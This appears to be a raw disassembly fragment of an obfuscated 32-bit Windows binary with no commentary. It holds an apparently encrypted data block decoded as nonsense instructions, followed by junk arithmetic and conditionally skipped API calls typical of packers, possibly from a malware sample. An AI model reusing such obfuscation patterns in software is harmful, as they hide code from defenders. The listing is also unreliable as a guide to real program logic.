  41efee:	and    edx,DWORD PTR ds:0x42827b
  41eff4:	xor    edx,DWORD PTR ds:0x4282e7
  41effa:	and    DWORD PTR ds:0x4283e7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x9dabd4b0
  41f021:	jo     0x41efbc
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0x30e7e7ee],ah
  41f02b:	cdq    
  41f02c:	sbb    al,0x30
  41f02e:	lahf   
  41f02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f030:	pusha  
  41f031:	inc    esp
  41f032:	xlat   BYTE PTR ds:[ebx]
  41f033:	xor    BYTE PTR [ecx-0x6efd721e],al
  41f039:	xlat   BYTE PTR ds:[ebx]
  41f03a:	paddq  mm2,QWORD PTR ds:0xa097db4e
  41f041:	stos   BYTE PTR es:[edi],al
  41f042:	pop    es
  41f043:	test   al,0x36
  41f045:	xor    esp,DWORD PTR [ebx+0x312d4053]
  41f04b:	cmc    
  41f04c:	or     esp,ebx
  41f04e:	mov    eax,0xaf97b8af
  41f053:	pop    esp
  41f054:	mov    ecx,0x44423f44
  41f059:	es inc ecx
  41f05b:	out    dx,eax
  41f05c:	das    
  41f05d:	stc    
  41f05e:	rcr    BYTE PTR ds:0xe20d5b14,1
  41f064:	sub    BYTE PTR [edx-0x5530017e],al
  41f06a:	int3   
  41f06b:	ror    DWORD PTR [edx],0xdb
  41f06e:	xchg   BYTE PTR [esi],bh
  41f070:	mov    esp,0x8f27b2bf
  41f075:	data16 scas al,BYTE PTR es:[edi]
  41f077:	mov    ebx,0xcdcbf632
  41f07c:	sub    BYTE PTR [ebx+0x10],0xa8
  41f080:	sbb    DWORD PTR [esi],esi
  41f082:	je     0x41f099
  41f084:	dec    ebp
  41f085:	cmp    BYTE PTR [ebp+0x36e39f05],0x5
  41f08c:	mov    ebx,edx
  41f08e:	data16 (bad) 
  41f090:	mov    edx,0x213d9ecc
  41f095:	div    DWORD PTR [ecx+0x53]
  41f098:	ret    
  41f099:	sub    ecx,DWORD PTR [eax-0x2e]
  41f09c:	xchg   esp,eax
  41f09d:	dec    edx
  41f09e:	dec    ebx
  41f09f:	mov    eax,0x667a3ec3
  41f0a4:	xchg   esp,eax
  41f0a5:	lea    esi,[ebx+ebx*1-0x2101f75a]
  41f0ac:	pop    eax
  41f0ad:	sbb    edx,edx
  41f0af:	loop   0x41f105
  41f0b1:	(bad)  
  41f0b2:	adc    ebp,ebx
  41f0b4:	push   esi
  41f0b5:	sbb    al,0xed
  41f0b7:	sub    BYTE PTR [edi-0x518631b2],0x97
  41f0be:	dec    edx
  41f0bf:	pop    ss
  41f0c0:	push   di
  41f0c2:	sbb    al,0x82
  41f0c4:	leave  
  41f0c5:	into   
  41f0c6:	popf   
  41f0c7:	(bad)  
  41f0c8:	pushf  
  41f0c9:	fwait
  41f0ca:	out    0xae,al
  41f0cc:	jae    0x41f0ed
  41f0ce:	mov    ebp,0x86f68509
  41f0d3:	lahf   
  41f0d4:	inc    esi
  41f0d5:	cmp    eax,0x7884c141
  41f0da:	repz (bad) 
  41f0dc:	(bad)  
  41f0dd:	and    DWORD PTR [esi+eax*4+0x38c8d0ac],esi
  41f0e4:	sub    BYTE PTR [ecx],bl
  41f0e6:	fs in  al,0x8b
  41f0e9:	sub    DWORD PTR [edi-0x71e1a0cf],edi
  41f0ef:	(bad)  
  41f0f0:	out    dx,eax
  41f0f1:	outs   dx,DWORD PTR ds:[esi]
  41f0f2:	jo     0x41f16f
  41f0f4:	inc    ebp
  41f0f5:	lea    esi,[ebp+0x26a30827]
  41f0fb:	dec    ebp
  41f0fc:	loop   0x41f108
  41f0fe:	leave  
  41f0ff:	mov    esi,0x6b350089
  41f104:	shr    DWORD PTR [edx+0xb],0xfb
  41f108:	jo     0x41f12f
  41f10a:	sbb    BYTE PTR [esi+0x740b3c81],dh
  41f110:	aaa    
  41f111:	movaps xmm6,xmm3
  41f114:	clc    
  41f115:	mov    WORD PTR [edi],ss
  41f117:	push   ds
  41f118:	rcr    DWORD PTR [edi+eax*4+0x3e19faf5],cl
  41f11f:	xchg   ebp,eax
  41f120:	adc    al,0xbd
  41f122:	mov    bh,0x2a
  41f124:	mov    edx,0x6fba427e
  41f129:	jmp    0x440ce38c
  41f12e:	bound  ebp,QWORD PTR [ebx]
  41f130:	shl    edx,0x80
  41f133:	sbb    al,0xd0
  41f135:	js     0x41f188
  41f137:	xchg   BYTE PTR [edi-0x3f],al
  41f13a:	jno    0x41f191
  41f13c:	inc    DWORD PTR [eax+0x69]
  41f13f:	cmp    al,0x38
  41f141:	loopne 0x41f0f2
  41f143:	outs   dx,DWORD PTR ds:[esi]
  41f144:	jbe    0x41f0e8
  41f146:	xor    cl,ch
  41f148:	sbb    eax,0x7615d2b7
  41f14d:	imul   ebp,DWORD PTR [eax],0xffffffce
  41f150:	push   cs
  41f151:	add    al,0xf9
  41f153:	shl    DWORD PTR [ebp+0x2c77577b],cl
  41f159:	push   ecx
  41f15a:	sub    dl,BYTE PTR [ebx-0x14]
  41f15d:	daa    
  41f15e:	addr16 test eax,0x416b9997
  41f164:	mov    DWORD PTR [edi+ebx*4+0x16],ecx
  41f168:	cmp    eax,0xde136efb
  41f16d:	mov    edi,0xfe37b742
  41f172:	arpl   WORD PTR [ebp+0x7c8d5dd7],cx
  41f178:	outs   dx,BYTE PTR ds:[esi]
  41f179:	push   edx
  41f17a:	and    al,0x8c
  41f17c:	push   esp
  41f17d:	jmp    0x8ce0:0xdfe7f948
  41f184:	lock repnz fld DWORD PTR [edi-0x6d04aa37]
  41f18c:	stos   DWORD PTR es:[edi],eax
  41f18d:	out    dx,eax
  41f18e:	inc    eax
  41f18f:	sub    eax,0x5ebb7924
  41f194:	gs nop
  41f196:	sub    BYTE PTR [edx+0x55baa303],bh
  41f19c:	jbe    0x41f1f1
  41f19e:	add    eax,0xeed17486
  41f1a3:	iret   
  41f1a4:	into   
  41f1a5:	sti    
  41f1a6:	sub    eax,0x4692f9d9
  41f1ab:	test   cl,bh
  41f1ad:	push   edx
  41f1ae:	mov    ecx,DWORD PTR [ecx+0x6aca5845]
  41f1b4:	ret    
  41f1b5:	stos   DWORD PTR es:[edi],eax
  41f1b6:	test   eax,0x9d4a9a6e
  41f1bb:	jno    0x41f182
  41f1bd:	pop    ebp
  41f1be:	xor    dh,BYTE PTR [ebx-0x43]
  41f1c1:	or     eax,0xf7eac807
  41f1c6:	aas    
  41f1c7:	sub    al,0xec
  41f1c9:	loope  0x41f1d7
  41f1cb:	(bad)  
  41f1cc:	push   ds
  41f1cd:	jno    0x41f187
  41f1cf:	pop    ebp
  41f1d0:	(bad)  
  41f1d1:	adc    BYTE PTR es:[edi+edi*8+0x67],dh
  41f1d6:	push   ebx
  41f1d7:	sbb    al,0x71
  41f1d9:	add    eax,0x5e88e1b0
  41f1de:	add    DWORD PTR [esi+0xcfafe13],ebx
  41f1e4:	xchg   ecx,eax
  41f1e5:	xchg   ebx,eax
  41f1e6:	or     BYTE PTR [esi+0x66],bl
  41f1e9:	aas    
  41f1ea:	ja     0x41f218
  41f1ec:	les    edx,FWORD PTR [edi-0x65]
  41f1ef:	out    0xb,eax
  41f1f1:	dec    ebx
  41f1f2:	enter  0xcb51,0xd5
  41f1f6:	pop    ss
  41f1f7:	dec    ecx
  41f1f8:	and    al,0xdd
  41f1fa:	scas   eax,DWORD PTR es:[edi]
  41f1fb:	gs pop edi
  41f1fd:	ret    0xa413
  41f200:	fbld   TBYTE PTR [esi]
  41f202:	and    BYTE PTR ds:[edi-0x27],al
  41f206:	xchg   DWORD PTR [ebx-0x5dfac25b],esp
  41f20c:	jne    0x41f211
  41f20e:	mov    esp,0xf57be374
  41f213:	push   cs
  41f214:	retf   0xb13
  41f217:	xor    dh,ch
  41f219:	imul   edx,DWORD PTR [ecx+edi*4],0xffffffc2
  41f21d:	mov    dh,0x13
  41f21f:	dec    esi
  41f220:	data16 mov cl,0xa5
  41f223:	sub    al,0xfd
  41f225:	sbb    BYTE PTR [ecx+ebx*4],ch
  41f228:	mov    esp,0x9599172b
  41f22d:	xchg   esp,eax
  41f22e:	jo     0x41f1d9
  41f230:	mov    DWORD PTR [esi+0x78],edx
  41f233:	jae    0x41f296
  41f235:	add    bh,ah
  41f237:	sbb    eax,0x37c9e0dc
  41f23c:	pop    edx
  41f23d:	mov    cl,0xe7
  41f23f:	or     eax,0x8574ddf2
  41f244:	lods   eax,DWORD PTR ds:[esi]
  41f245:	iret   
  41f246:	pop    ebx
  41f247:	call   0x1ca73a79
  41f24c:	shl    BYTE PTR [edx+ecx*2],0x76
  41f250:	adc    BYTE PTR [edx-0x3f4901d],0x85
  41f257:	inc    esi
  41f258:	gs fs inc ebp
  41f25b:	scas   eax,DWORD PTR es:[edi]
  41f25c:	stc    
  41f25d:	test   al,0x89
  41f25f:	jmp    0x1aa:0x84d441ef
  41f266:	cmp    eax,0x78196fdc
  41f26b:	(bad)  
  41f26c:	mov    dl,BYTE PTR [ebp+0x4d]
  41f26f:	inc    eax
  41f270:	fst    st(2)
  41f272:	shr    BYTE PTR [ebp-0x202f8e8a],0xb5
  41f279:	add    eax,0x2a9c6795
  41f27e:	shrd   DWORD PTR [ebx],esi,0x6a
  41f282:	out    0x88,ax
  41f285:	adc    eax,0x147d7aa8
  41f28a:	iret   
  41f28b:	xchg   ebx,eax
  41f28c:	mov    ds:0xcb4db807,eax
  41f291:	sti    
  41f292:	or     al,0xd4
  41f294:	fnsave [esi]
  41f296:	push   esp
  41f297:	and    eax,0xb1f896ac
  41f29c:	xor    ah,BYTE PTR [eax-0x76bb9c8b]
  41f2a2:	test   DWORD PTR [ebx-0x17],eax
  41f2a5:	test   DWORD PTR [ecx+edx*4],ebp
  41f2a8:	jg     0x41f230
  41f2aa:	or     edx,DWORD PTR [esi+ebx*4+0x45]
  41f2ae:	fbstp  TBYTE PTR [ebx+edx*2]
  41f2b1:	nop
  41f2b2:	xchg   edi,eax
  41f2b3:	mov    esp,0x1b6c1c44
  41f2b8:	inc    ebx
  41f2b9:	adc    DWORD PTR [edi+0x46f06bae],edi
  41f2bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2c0:	xor    al,0x62
  41f2c2:	fld    DWORD PTR ds:0xe52eb05b
  41f2c8:	lock in eax,dx
  41f2ca:	test   eax,0x90dc2317
  41f2cf:	jmp    0x41f31a
  41f2d1:	in     eax,dx
  41f2d2:	imul   edi
  41f2d4:	xchg   esi,eax
  41f2d5:	jmp    0xa272:0x81381809
  41f2dc:	xchg   edi,eax
  41f2dd:	jo     0x41f29a
  41f2df:	add    DWORD PTR [edi],edi
  41f2e1:	dec    ebp
  41f2e2:	sub    edi,DWORD PTR [ebx+eiz*1-0x55]
  41f2e6:	int3   
  41f2e7:	loop   0x41f2f5
  41f2e9:	jnp    0x41f2fe
  41f2eb:	sahf   
  41f2ec:	icebp  
  41f2ed:	cmp    edi,DWORD PTR [edi-0x4dd120dc]
  41f2f3:	rcr    DWORD PTR [ecx+0x18b7e901],cl
  41f2f9:	(bad)  [esi+0x3918c0e7]
  41f2ff:	hlt    
  41f300:	imul   DWORD PTR [ebp+eiz*2-0x4a]
  41f304:	xchg   ebp,eax
  41f305:	mov    ds:0x2aea9f3e,al
  41f30a:	mov    esp,0xed34d304
  41f30f:	lea    esi,[edi-0x10]
  41f312:	leave  
  41f313:	jbe    0x41f33b
  41f315:	cmp    DWORD PTR [ebp-0x166f687d],0x47f2cc85
  41f31f:	pop    ecx
  41f320:	mov    bl,0xc3
  41f322:	std    
  41f323:	ins    DWORD PTR es:[edi],dx
  41f324:	sub    eax,0x1e8dfc0a
  41f329:	pop    ebx
  41f32a:	jl     0x41f384
  41f32c:	scas   al,BYTE PTR es:[edi]
  41f32d:	pop    esi
  41f32e:	into   
  41f32f:	push   ss
  41f330:	rcr    DWORD PTR [esi],0x4d
  41f333:	mov    dl,0xa2
  41f335:	repz fmul st,st(7)
  41f338:	push   esi
  41f339:	pop    ds
  41f33a:	pushw  0xf649
  41f33e:	mov    dl,0xc6
  41f340:	clc    
  41f341:	dec    ebx
  41f342:	push   ecx
  41f343:	xchg   edi,ebp
  41f345:	xchg   ebp,eax
  41f346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f347:	mov    ch,0x26
  41f349:	xchg   edx,eax
  41f34a:	jbe    0x41f377
  41f34c:	mov    ebx,0xcd5ec614
  41f351:	sar    eax,0xc4
  41f354:	push   0x38
  41f356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f357:	push   ecx
  41f358:	pop    ebx
  41f359:	jge    0x41f32b
  41f35b:	mov    ah,bl
  41f35d:	stc    
  41f35e:	jmp    0x41f372
  41f360:	xlat   BYTE PTR ds:[ebx]
  41f361:	retf   0x3a41
  41f364:	sar    DWORD PTR [ebp-0x3814cd0d],cl
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4283533d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x42826f
  41f37e:	mov    ecx,DWORD PTR ds:0x4282b7
  41f384:	mov    ecx,DWORD PTR ds:0x4282a3
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42828f,ebx
  41f397:	cmp    DWORD PTR ds:0x428353,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428163
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e60
  41f3c7:	sub    ecx,DWORD PTR ds:0x428287
  41f3cd:	mov    DWORD PTR ds:0x4281d7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428333,ebx
  41f3dd:	or     DWORD PTR ds:0x42834b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281df
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428367,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x4281bf,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x4283cb,0x0
  41f428:	mov    DWORD PTR ds:0x42835f,0xae0
  41f432:	mov    DWORD PTR ds:0x42819b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x4283bb
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428343,ebx
  41f449:	mov    DWORD PTR ds:0x4281bf,0x2430
  41f453:	cmp    DWORD PTR ds:0x4283cb,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f75
  41f468:	call   DWORD PTR ds:0x428ee4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283d7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281d7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x42832f,0x6486
  41f49d:	mov    DWORD PTR ds:0x42829b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x4282cb,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283d3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281d7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42803b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e64
  41f4d7:	neg    DWORD PTR ds:0x4281cb
  41f4dd:	and    DWORD PTR ds:0x4282af,0x428333
  41f4e7:	and    DWORD PTR ds:0x4283af,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x4281c7
  41f4f4:	sbb    edx,DWORD PTR ds:0x42834f
  41f4fa:	mov    DWORD PTR ds:0x4281c7,edx
  41f500:	sub    DWORD PTR ds:0x4282c3,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x4281cf,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283d3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x4281b3,0x0
  41f53b:	mov    DWORD PTR ds:0x4283cf,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42828f,0x6044
  41f55b:	not    DWORD PTR ds:0x42829b
  41f561:	cmp    DWORD PTR ds:0x4281b3,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e68
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428193,edi
  41f5a3:	and    DWORD PTR ds:0x42832b,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428343
  41f5b0:	add    edx,DWORD PTR ds:0x42833b
  41f5b6:	mov    DWORD PTR ds:0x428343,edx
  41f5bc:	add    DWORD PTR ds:0x428337,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42829b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x4283cf,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281db,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42835f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42834f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283d3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428297,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x4282ab,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x4282c7,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428293
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282df,0x35b0
  41f651:	cmp    DWORD PTR ds:0x4282ab,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e6c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42826b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428337
  41f67a:	add    DWORD PTR ds:0x42835b,ecx
  41f680:	sbb    DWORD PTR ds:0x4282cf,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x4281a3
  41f68c:	adc    DWORD PTR ds:0x428197,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283ff
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42828f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428363,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428347,0x0
  41f6e5:	mov    DWORD PTR ds:0x42834f,0x6375
  41f6ef:	not    DWORD PTR ds:0x4281af
  41f6f5:	mov    DWORD PTR ds:0x42826b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42827b,0x2351
  41f70a:	mov    DWORD PTR ds:0x4282bf,ebx
  41f710:	cmp    DWORD PTR ds:0x428347,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x4282ab
  41f727:	call   DWORD PTR ds:0x428e70
  41f72d:	movzx  ecx,WORD PTR ds:0x42827b
  41f734:	xor    DWORD PTR ds:0x4283e7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x4282ab
  41f740:	add    ecx,DWORD PTR ds:0x4282a3
  41f746:	mov    DWORD PTR ds:0x4282ab,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x4282bb
  41f752:	adc    DWORD PTR ds:0x4283cb,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428367,ebx
  41f75f:	sub    DWORD PTR ds:0x4281c7,edx
  41f765:	and    DWORD PTR ds:0x428347,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42835b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x4283c7,0x42833b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428277,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428287
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42827b,0x4281d7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x4283c7,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x4282c7
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283d3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x4283b7
  41f7d9:	mov    DWORD PTR ds:0x4283ab,ecx
  41f7df:	mov    DWORD PTR ds:0x42834f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x4282cf,0xe1
  41f7f8:	mov    DWORD PTR ds:0x4281c7,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283d3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427fba
  41f813:	push   0x427f21
  41f818:	call   DWORD PTR ds:0x428ee8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283fb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x4282b7,ecx
  41f830:	adc    DWORD PTR ds:0x42819f,edi
  41f836:	and    DWORD PTR ds:0x4283df,0x3101
  41f840:	mov    DWORD PTR ds:0x4283e7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x4281af,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42829f
  41f857:	mov    DWORD PTR ds:0x42828b,0x4504
  41f861:	mov    DWORD PTR ds:0x4283bf,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283e3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42834f,ebx
  41f87c:	cmp    DWORD PTR ds:0x4281af,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fec
  41f890:	push   0x427ff6
  41f895:	call   DWORD PTR ds:0x428eec
  41f89b:	and    DWORD PTR ds:0x4281c7,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42834f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283e3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x4281b7,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x4282a7,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x4283bb,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x4281a3,0x4283df
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x4282b7
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42826f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428333,0x0
  41f93e:	mov    DWORD PTR ds:0x428343,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281d3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282df
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428333,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428ef0
  41f979:	sbb    DWORD PTR ds:0x4283e3,0x209
  41f983:	xor    DWORD PTR ds:0x4283d3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x4282cf,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281d3
  41f9bf:	or     DWORD PTR ds:0x4283bf,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428337,0x0
  41f9d1:	mov    DWORD PTR ds:0x42827b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428333,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42833b
  41f9f0:	cmp    DWORD PTR ds:0x428337,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e74
  41fa08:	adc    DWORD PTR ds:0x4283cf,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428353,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x4283ab
  41fa1b:	add    DWORD PTR ds:0x4283bb,ecx
  41fa21:	add    DWORD PTR ds:0x4283b3,0x77eb
  41fa2b:	or     DWORD PTR ds:0x428333,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282df
  41fa3b:	and    DWORD PTR ds:0x42819f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42828b,0x4281cb
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282d3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x4282b7,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428347,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281d7
  41fa8d:	mov    DWORD PTR ds:0x4281cf,0x4079
  41fa97:	cmp    DWORD PTR ds:0x4282b7,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x4280c3
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e78
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428193
  41fabc:	sbb    ecx,DWORD PTR ds:0x42828b
  41fac2:	mov    DWORD PTR ds:0x428193,ecx
  41fac8:	xor    DWORD PTR ds:0x4282db,edx
  41face:	movzx  ecx,WORD PTR ds:0x428293
  41fad5:	or     DWORD PTR ds:0x42832b,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x4283bb
  41fae3:	add    DWORD PTR ds:0x4282cf,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x4281ab
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281db,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42833f
  41fb06:	mov    DWORD PTR ds:0x4283c3,edx
